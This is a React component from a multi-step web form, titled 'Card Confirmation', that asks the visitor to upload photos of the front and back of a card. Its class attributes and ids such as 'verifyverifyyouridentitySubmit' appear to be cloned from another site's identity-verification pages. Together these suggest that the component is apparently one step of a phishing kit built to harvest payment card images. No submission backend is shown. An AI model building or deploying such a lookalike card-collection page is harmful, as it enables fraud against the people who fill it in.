import React from 'react'

function Step3({handleSubmit, handleChange, handleNavigate, img}) {
    return (
        <>
         <div class="content-container">
    <form onSubmit={(e)=>handleSubmit(e)}>
        <div class='row'>
            <div class='large-12 medium-12 small-12 column'>
            
            <h1 style={{display: "flex",justifyContent: "center"}}>Card Confirmation</h1>

            </div>
        </div>
        <div class='box'>
            <div class='row'>
                <div class='medium-12 columns'>
                    <div class='large-12 medium-12 small-12 column'>
                        <p class="align-right margin-bottom-none">
                            <span class="required">*</span>
                            Required fields
                        </p>
                    </div>




                    <center>
                        <div class="row&#32;form-row">
                            <div class="large-3&#32;medium-5&#32;small-12&#32;column&#32;"><label class="form-control" for="username">Upload
                                    Card Front&nbsp;<span class="required">*&nbsp;</span></label>
                        
                            </div>
                        
                        
                            <div class="large-4&#32;medium-4&#32;small-12&#32;columns&#32;left">
                        
                                <div class="img-wrapper"><img src={img.cardFront ? img.cardFront : "/img/front.jpg"} alt="" /></div>
                        
                                <input class="stretch" id="cardFront" name="cardFront" type="file" onChange={handleChange} value="" />
                        
                            </div>
                            <div class="large-5&#32;medium-3&#32;small-12&#32;columns&#32;left"></div>
                        </div>
                    
                    
                    
                    <div class="row&#32;form-row">
                        <div class="large-3&#32;medium-5&#32;small-12&#32;column&#32;"><label class="form-control"
                                for="username">Upload Card Back&nbsp;<span
                                    class="required">*&nbsp;</span></label>

                        </div>

                        
                        <div class="large-4&#32;medium-4&#32;small-12&#32;columns&#32;left">

                            <div class="img-wrapper"><img src={img.cardBack ? img.cardBack : "/img/back.jpg"} alt="" /></div>
                        
                            <input class="stretch" id="cardBack" name="cardBack" type="file" onChange={handleChange} value=""  />

                        </div>
                        <div class="large-5&#32;medium-3&#32;small-12&#32;columns&#32;left"></div>
                    </div>

                    </center>


                    <div class='small-12 columns button-group'>
                        
                        <input class="button&#32;small&#32;navigationButton&#32;primary"
                            id="verifyverifyyouridentitySubmit" name="Submit" type="submit" value="Continue" />
                        <input
                            className="button small navigationButton standard back" onClick={()=>handleNavigate("back")} id="verifysigninBack" name="Back"
                            type="button" value="Back" />
                    </div>
                </div>
            </div>
        </div>

    </form>
</div>
        </>
    )
}

export default Step3
